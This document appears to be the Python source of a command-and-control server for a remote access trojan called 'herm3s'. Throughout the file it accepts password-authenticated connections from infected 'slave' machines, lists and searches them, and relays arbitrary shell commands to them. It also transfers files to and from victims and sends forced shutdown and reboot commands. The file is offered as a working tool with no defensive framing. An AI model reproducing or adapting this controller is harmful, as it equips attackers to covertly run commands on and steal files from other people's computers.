import socket
import threading
import time
import sys
from queue import Queue

lock = threading.Lock()  # this will lock things so that threads don't bind together at the same time
queue = Queue()
# defaults (change these parameters)
sv_ip = '127.0.0.1'
sv_port = 3223
password = 'change_me'
silent = 0  # 0 = verbose/ -1 = very verbose/ 1 = silent

# do not play around these unless you read the whole code
upload_perm = 1  # 0 = True / 1 = False
ref_perm = 0  # 0 = True / 1 = False
ref_delay = 5  # second between every refresh wave

number_of_threads = 3
jobs_number = [1, 2, 3]

dic_cli = {}
dic_addr = {}
blocked_ip = {}
dic_name = {}
number_of_connections = 5000


# ------------------- Thread 1 -------------------
# get the fuck online
def get_online(sv_ip, sv_port, number_of_connections):
    try:
        # make socket and bind to ip port and listen
        server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        server.bind((sv_ip, int(sv_port)))
        server.listen(number_of_connections)
        print('''
.-..-.                    .----.
: :; :                    `--  ;
:    : .--. .--. ,-.,-.,-. .' '  .--.
: :: :' '_.': ..': ,. ,. : _`,`.`._-.'
:_;:_;`.__.':_;  :_;:_;:_;`.__.'`.__.'


''' + 'bind to  ----> ' + sv_ip + " : " + str(sv_port) + '\n')
        return server
    except socket.errno as msg:
        if silent <= 0:
            print('\n' + str(msg))
        time.sleep(2)
        get_online(sv_ip, sv_port, number_of_connections)


# accept connections and make sure its not spam
def get_accept(server, password):
    global dic_name, dic_addr, dic_cli, blocked_ip
    try:
        cli, addr = server.accept()
        cli.settimeout(5)
        intro = cli.recv(2048)
        if password in intro.decode():
            if intro.decode().split()[1] == 'join':
                name = intro.decode().replace(password + ' join ', '')
                ID = list_count() + 1
                lock.acquire()
                dic_cli[ID] = cli
                dic_addr[ID] = addr[0]
                dic_name[ID] = name
                lock.release()
                if silent <= 0:
                    print('\nConnection from ' + dic_addr[ID] + "  ---> " + dic_name[ID])
            elif intro.decode().split()[1] == 'want_get':
                path = intro.decode().replace(password + ' want_get ', '')
                downloader_thread = threading.Thread(target=upload(cli, path))
                downloader_thread.daemon = True
                downloader_thread.start()
            elif intro.decode().split()[1] == 'want_send':
                if upload_perm == 1:
                    cli.close()
                else:
                    filename = intro.decode().replace(password + ' want_send ', '')
                    dl_thread = threading.Thread(target=download(cli, filename))
                    dl_thread.daemon = True
                    dl_thread.start()
        else:
            lock.acquire()
            if silent == -1:
                print('\n somethind tried to connect with wrong pass or anything : ' + intro.decode())
            elif silent == 0:
                print('\n something tried to connect but not your slave')
            cli.close()
            lock.release()
    except:
        if silent <= 0:
            print('\n Unknown connection timeout')


# slave counter
def list_count():
    global dic_cli
    lock.acquire()
    try:
        number = len(dic_cli)
        lock.release()
        return number

    except:
        print('Some thing happen in counting the list of slaves')
        lock.release()
        return None


# list func
def list_all():
    global dic_addr, dic_name
    try:
        lock.acquire()
        print('\n\n      ---------- list of slaves ----------- ')
        for ID in dic_cli:
            print('\n    ' + str(ID) + '     ' + dic_addr[ID] + '   ---->  ' + dic_name[ID])
        print('\n      -----------------End---------------- \n\n')
        lock.release()
    except:
        lock.release()
        print('\n Cant list slaves for some errs\n')


# search the list for name
def search_name(keyword):
    lock.acquire()
    print('\n\n      ---------- list of slaves ----------- ')
    for x in dic_name:
        if keyword in dic_name[x]:
            print('\n    ' + str(x) + '     ' + dic_addr[x] + '   ---->  ' + dic_name[x])
        else:
            pass
    print('\n      -----------------End---------------- \n\n')
    lock.release()


# together for threading
def t1_all(sv_ip, sv_port, number_of_connections):
    global password
    global server
    server = get_online(sv_ip, sv_port, number_of_connections)
    while True:
        get_accept(server, password)


# ------------------------------- Thread 2

# interactive shell
def shell():
    global ref_perm, ref_delay
    global silent

    time.sleep(1)
    while True:
        cmd = input('herm3s> ')
        if cmd == '':
            pass

        elif 'search' in cmd:
            keyword = cmd.replace('search ', '')
            search_name(keyword)

        elif 'refresh' in cmd:
            command = cmd.replace('refresh ', '')
            if command == 'check':
                if ref_perm == 0:
                    print('\n[SYSTEM] refreshing is up and running\n')
                elif ref_perm == 1:
                    print('\n[SYSTEM] refreshing is offline or stopped\n')
                else:
                    print('\n[NOTE] something bad happen to refreshing function be sure to okay that\n')
                print('\n      refreshing delay = ' + str(ref_delay))
            elif command == 'start':
                ref_perm = 0
                print('\n[SYSTEM] refreshing started successfully\n')
            elif command == 'stop':
                ref_perm = 1
                print('\n[SYSTEM] refreshing stopped successfully \n')
            else:
                try:
                    ref_delay = int(command)
                except:
                    print("\nRecheck the command its wrong somehow\n")

        elif cmd in ['cls', 'clear']:
            print(
                '\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n')

        elif cmd == 'list':
            list_all()

        elif cmd == 'count':
            print('\n We have ' + str(list_count()) + " Slaves in the list!\n")

        elif 'select' in cmd:
            ID = cmd.replace('select ', '')
            try:
                cli, addr, name = slave_selector(int(ID))
                if cli == None:
                    print('\nwrong Slave selection please recheck you list and ID\n')
            except:
                print('\n err in selecting target check the command!')

            else:
                lock.acquire()
                ref_perm = 1
                lock.release()
                slave_point(cli, addr, name, ID)

        elif 'test' in cmd:
            if cmd == 'test all':
                try:
                    for x in range(list_count()):
                        x += 1
                        test_one(x)
                except:
                    print('\nSomething is wrong')
                    pass

            else:
                try:
                    target = cmd.replace('test ', '')
                    test_one(int(target))
                except:
                    print('\n Wrong command for test')


        elif 'verbose' in cmd:
            command = cmd.replace('verbose ', '')
            if command == '0':
                print('\n verbosity set to medium level ')
                silent = 0
            elif command == '1':
                print('\n verbosity set to silent level ')
                silent = 1
            elif command == '-1':
                print('\n verbosity set to High level ')
                silent = -1
            elif command == 'check':
                print('Your verbosity is set to: ' + str(silent))
            else:
                print('\n command is Wrong for this option check the help')

        elif cmd == 'help':
            help()

        else:
            print('\nCommand Not found\n')


# slave selection for goodies
def slave_selector(ID):
    ID = int(ID)
    if ID in dic_cli:
        lock.acquire()
        cli = dic_cli[ID]
        addr = dic_addr[ID]
        name = dic_name[ID]
        lock.release()
        if addr == None:
            return None, None, None
        else:
            return cli, addr, name


# Slave control point
def slave_point(cli, addr, name, ID):
    global ref_perm
    global upload_perm
    while True:
        cmd = input(name + '(' + addr + ')>')
        if cmd == 'exit':
            break

        elif cmd == '':
            cli.settimeout(0.2)
            try:
                print(cli.recv(8500).decode())
            except:
                pass
        elif cmd == 'be dead':
            msg = 'be dead ' + password
            cli.send(msg.encode())
            cli.close()
            rem_cli(ID)
            break

        elif 'rename' in cmd:
            cli.send(cmd.encode())
            cli.close()
            rem_cli(ID)
            break
        elif 'send' == cmd.split()[0]:
            cli.send(cmd.encode())
        elif 'recv' == cmd.split()[0]:
            upload_perm = 0
            cli.send(cmd.encode())
        elif cmd == 'del':
            cli.close()
            rem_cli(ID)
            break

        elif cmd == 'shutdown':
            cli.send('shutdown /p /t 0 /s'.encode())
            rem_cli(ID)
            break
        elif cmd == 'reboot':
            cli.send('shutdown -t 0 -r'.encode())
            rem_cli(ID)
            break

        elif cmd in ['cls', 'clear']:
            print(
                '\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n')

        elif cmd == 'help':
            help()
        elif cmd == 'list':
            list_all()
        elif cmd == 'count':
            list_count()

        else:
            try:
                cli.send(cmd.encode())
                cli.settimeout(3)
                print(cli.recv(8500).decode())
                cli.settimeout(None)
            except socket.error as err:
                if str(err) == '[WinError 10054] An existing connection was forcibly closed by the remote host':
                    print('\n slave doesnt respond type del to delete it\n')
                else:
                    print('It seems like you entered wrong command')

    ref_perm = 0


# help banner
def help():
    msg = """

----- main shell commands ----

help                    show this banner
search                  [keyword]search in list for specific Slave name
refresh                 check/stop/start/[delay number]
verbose                 -1/0/1/check {-1:High, 0:medium, 1:silent} verbosity
select                  [ID] go to slave control point
clear                   clear the screen

----- Slave control point ----

send                    [path][filename] send file to  slave
recv                    [path][filename] get file from slave
melt                    check/start/stop
exit                    back to main shell
rename                  [new_name] rename the slave and reset the connection
be dead                 turn off the slave(next reboot get online)
shutdown                shutdown slave machine
reboot                  reboot slave machine

"""
    print(msg)
x = 'beginners completely '
# -------------------- Thread 3
def rem_cli(id_number):
    id_number = int(id_number)
    lock.acquire()
    try:
        del dic_cli[id_number]
        del dic_name[id_number]
        del dic_addr[id_number]
    except:
        if silent <= 0:
            print('cant del the slave for some reseaon')
    lock.release()


def test_one(id_number):
    if id_number in dic_cli:
        lock.acquire()
        cli = dic_cli[id_number]
        name = dic_name[id_number]
        ip = dic_addr[id_number]
        lock.release()
        try:
            cli.settimeout(5)
            cli.send('ping'.encode())
            answer = cli.recv(1024)
            if answer.decode() == 'pong':
                cli.settimeout(None)
                pass
            else:
                if silent == 0:
                    print('\nSlave wrong answer')
                elif silent == -1:
                    print('\nSlave wrong answer == \n ' + str(answer.decode()))
                rem_cli(id_number)

        except socket.error as msg:
            if silent == 0:
                print('\n Slave offline removed The list ---> ' + ip + "   " + name + "\n")
            elif silent == -1:
                print('\n Slave offline removed The list ---> ' + ip + "   " + name + " error is: \n" + str(msg))
            elif silent == 1:
                pass
            rem_cli(id_number)


def refresh():
    while True:
        if ref_perm == 0:
            for ID in range(list_count()):
                ID += 1
                t = threading.Thread(target=test_one(ID))
                t.daemon = True
                t.start()

        else:
            pass
        time.sleep(ref_delay)


# upload
def upload(sock, path):
    print('\n------Upload--Started-----')
    if True:
        f = open(path, 'rb')
        size = 0
        while True:
            try:
                temp_chunk = f.read(1024)
                size += len(temp_chunk)
                if temp_chunk == ''.encode():
                    sock.close()
                    f.close()
                    print('\n we sent ' + str(size) + ' bytes(make sure slave recved it all)')
                    break
                else:
                    sock.send(temp_chunk)
            except:
                print('\n err in uploading file!')
                f.close()
                sock.close()
                break
    else:
        print('\n something tried to download this file: ' + path + ' with this password ' + password)


# download
def download(sock, file_name):
    global upload_perm
    print('\n\nDownloading... ')
    try:
        f = open(file_name, 'wb')
        total_size = 0
        chunk_number = 1
        num_of_try = 10
        sock.settimeout(3)
        sock.send('fine'.encode())
        while True:
            try:
                chunk = sock.recv(1024)
                if chunk != ''.encode():
                    f.write(chunk)
                    total_size += len(chunk)
                    chunk_number += 1
                    num_of_try = 10
                else:
                    print('\nMaster downloaded ' + str(total_size) + ' bytes')
                    f.close()
                    break

            except:
                num_of_try -= 1
                if num_of_try == 0:
                    break
    except:
        pass
    upload_perm = 1


# main spin
def work():
    while True:
        x = queue.get()
        if x == 2:
            shell()
        elif x == 1:
            t1_all(sv_ip, sv_port, number_of_connections)
        elif x == 3:
            refresh()
        else:
            pass

        queue.task_done()


def creat_jobs():
    for x in jobs_number:
        queue.put(x)
    queue.join()


def create_workers():
    for x in range(number_of_threads):
        t = threading.Thread(target=work)  # make Thread
        t.daemon = True  # die when main die
        t.start()


# run

create_workers()
creat_jobs()
